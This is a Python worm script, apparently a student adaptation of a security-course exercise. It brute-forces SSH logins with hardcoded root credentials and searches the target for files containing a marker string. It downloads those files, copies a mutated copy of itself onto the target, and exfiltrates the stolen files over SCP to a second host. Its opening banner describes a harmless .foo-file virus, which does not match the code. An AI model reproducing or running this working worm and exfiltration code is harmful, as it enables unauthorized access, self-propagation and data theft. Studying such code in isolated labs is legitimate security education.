#!/usr/bin/env python
import sys
import os
import glob

import random
import paramiko
import scp
import select
import signal

##   FooVirus.py
##   Author: Avi kak (kak@purdue.edu)
##   Date:   April 5, 2016; Updated April 6, 2022

print("""\nHELLO FROM FooVirus\n\n
This is a demonstration of how easy it is to write
a self-replicating program. This virus will infect
all files with names ending in .foo in the directory in
which you execute an infected file.  If you send an
infected file to someone else and they execute it, their,
foo files will be damaged also.

Note that this is a safe virus (for educational purposes
only) since it does not carry a harmful payload.  All it
does is to print out this message and comment out the
code in .foo files.\n\n""")







def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)
 


def get_new_username():
    return ['root']      # need a working username for debugging
    
def get_new_passwd():
    return ['mypassword']      # need a working username for debugging
    

def get_fresh_ipaddress():
    return ['172.17.0.2']   
                    
while True:
    usernames = get_new_username()
    passwds =   get_new_passwd()

    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddress():
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []
                files_of_interest_at_machine = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected\n")
                    # Let's make sure that the target host was not previously 
                    # infected:
                    received_list = error = None
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error: 
                        print(error)
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print("\n\noutput of 'ls' command: %s" % str(received_list))
                    # if ''.join(received_list).find('AbraWorm') >= 0: 
                    #     print("\nThe target machine is already infected\n")      
                    #     continue
                    # Now let's look for files that contain the string 'abracadabra'
                    cmd = 'grep -rl abracadabra *'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    error = stderr.readlines()
                    if error: 
                        print(error)
                        continue
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    for item in received_list:
                        files_of_interest_at_target.append(item.strip())
                    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))


                    scpcon = scp.SCPClient(ssh.get_transport())
                    if len(files_of_interest_at_target) > 0:

                        folder_name = 'Folder-' + ip_address

                        if not os.path.exists(folder_name):
                            os.mkdir(folder_name)

                        for target_file in files_of_interest_at_target:
                            target_file_string = target_file.decode('utf-8')

                            # Download the file
                            scpcon.get(target_file_string)

                            # Extract the filename
                            if '/' in target_file_string:
                                filename = target_file_string.rsplit('/', 1)[-1]
                            else:
                                filename = target_file_string

                            # Move the file to the created folder
                            relocation_path = os.path.join(folder_name, filename)
                            os.rename(filename, relocation_path)

                            files_of_interest_at_machine.append(relocation_path)
                                        
                    scpcon = scp.SCPClient(ssh.get_transport())
                    
                    input_file_path = '1805092_3.py'
                    output_file_path = 'NewWormSent.py'

                    # Read the content of the input file
                    with open(input_file_path, 'r') as input_file:
                        content = input_file.read()

                    # Split the content into a list of lines
                    lines = content.splitlines()

                    # Randomly determine the positions where newlines will be inserted
                    num_lines = len(lines)
                    num_insertions = random.randint(1, num_lines)  # You can adjust the range as needed
                    insertion_positions = random.sample(range(num_lines), num_insertions)

                    # Insert newlines at the randomly chosen positions
                    for position in insertion_positions:
                        lines[position] += '\n'

                    # Join the lines back into a single string
                    modified_content = '\n'.join(lines)

                    # Write the modified content to the output file
                    with open(output_file_path, 'w') as output_file:
                        output_file.write(modified_content)

                    if '1805092_3.py'.encode('utf-8') not in files_of_interest_at_target:
                        scpcon.put("NewWormSent.py")  
                    os.remove("NewWormSent.py")              
                    scpcon.close()
                except:
                    continue

                if len(files_of_interest_at_target) > 0:
                    print("\nWill now try to exfiltrate the files")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        #  For exfiltration demo to work, you must provide an IP address and the login 
                        #  credentials in the next statement:
                        ssh.connect('172.17.0.3',port=22,username='root',password='mypassword',timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\n\nconnected to exhiltration host\n")
                        for filename in files_of_interest_at_machine:
                            scpcon.put(filename)
                        scpcon.close()
                    except: 
                        print("No uploading of exfiltrated files\n")
                        continue
         
    break


